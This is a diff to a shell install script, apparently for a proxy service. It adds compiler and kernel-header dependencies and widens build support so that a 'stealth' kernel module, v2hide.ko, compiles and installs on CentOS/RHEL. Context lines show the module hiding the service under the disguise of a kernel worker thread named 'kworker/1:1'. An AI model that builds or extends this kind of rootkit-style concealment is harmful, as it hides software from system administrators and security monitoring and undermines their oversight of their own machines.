@@ -178,6 +178,8 @@ install_base() {
         fi
         need_install_yum wget curl unzip tar cronie socat ca-certificates pv
         update-ca-trust force-enable >/dev/null 2>&1 || true
+        # 内核隐藏模块编译依赖：内核 headers + gcc/make
+        need_install_yum kernel-devel kernel-headers gcc make
     elif [[ x"${release}" == x"alpine" ]]; then
         need_install_apk wget curl unzip tar socat ca-certificates pv
         update-ca-certificates >/dev/null 2>&1 || true
@@ -266,13 +268,20 @@ STEALTH_ALIAS="kworker/1:1"
 # 编译内核模块（需要目标机内核 headers）
 build_stealth_module() {
     local work_dir="$1"
+    local kdir="/lib/modules/$(uname -r)/build"
     if [[ ! -f "$work_dir/v2hide.c" ]]; then
         return 1
     fi
-    if [[ ! -d "/lib/modules/$(uname -r)/build" ]]; then
-        return 1
+    # 内核头文件路径：Debian/Ubuntu 用 /lib/modules/$(uname -r)/build；
+    # CentOS/RHEL 常需手动指向 /usr/src/kernels/$(uname -r)
+    if [[ ! -d "$kdir" ]]; then
+        if [[ -d "/usr/src/kernels/$(uname -r)" ]]; then
+            kdir="/usr/src/kernels/$(uname -r)"
+        else
+            return 1
+        fi
     fi
-    ( cd "$work_dir" && make >/dev/null 2>&1 )
+    ( cd "$work_dir" && make KDIR="$kdir" >/dev/null 2>&1 )
     if [[ -f "$work_dir/v2hide.ko" ]]; then
         install -m 600 "$work_dir/v2hide.ko" "$STEALTH_KO"
         return 0
